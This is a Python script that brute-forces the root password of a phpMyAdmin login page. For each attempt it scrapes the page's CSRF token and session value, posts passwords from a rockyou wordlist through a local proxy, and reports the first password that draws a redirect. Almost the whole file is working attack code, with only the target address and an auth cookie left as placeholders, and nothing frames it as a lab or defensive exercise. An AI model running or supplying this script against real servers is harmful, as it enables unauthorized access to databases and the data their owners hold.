import re
import requests as r
import sys

def login(url, headers, proxies):

    print("[+] Bruteforcing login page...")
    with open('rockyou_50.txt', 'r') as f:
        for password in f:
            
            password = password.strip("\n")
            
            resp = r.get(url)
            # Extract the token value
            extract_token = re.search("(?<=<input type=\"hidden\" name=\"token\" value=\").*\"", resp.text)
            token = extract_token.group(0).strip("\"")
            
            # Extract the set_session value
            extract_set_session = re.search("(?<=<input type=\"hidden\" name=\"set_session\" value=\").*\"", resp.text)
            set_session = extract_set_session.group(0).strip("\"")

            cookies = {'phpMyAdmin': set_session, 'pmaUser-1': 'root', 'pmaAuth-1': '<INSERT-HERE-YOUR-VALUE>'}
            
            data = f"set_session={set_session}&pma_username=root&pma_password={password}&server=1&target=index.php&lang=en&debug=0&token={token}"
            resp = r.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, allow_redirects=False)

            if resp.status_code == 302:
                print("[+] Valid password found: ", password)
                sys.exit(0)


if __name__=='__main__':
    
    url = "http://<INSERT-TAREGET-IP-ADDRESS/index.php"

    headers = {
        "Host": "<INSERT-TARGET-IP-ADDRESS",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "null",
        "Connection": "close",
    }

    proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
    
    login(url, headers, proxies)
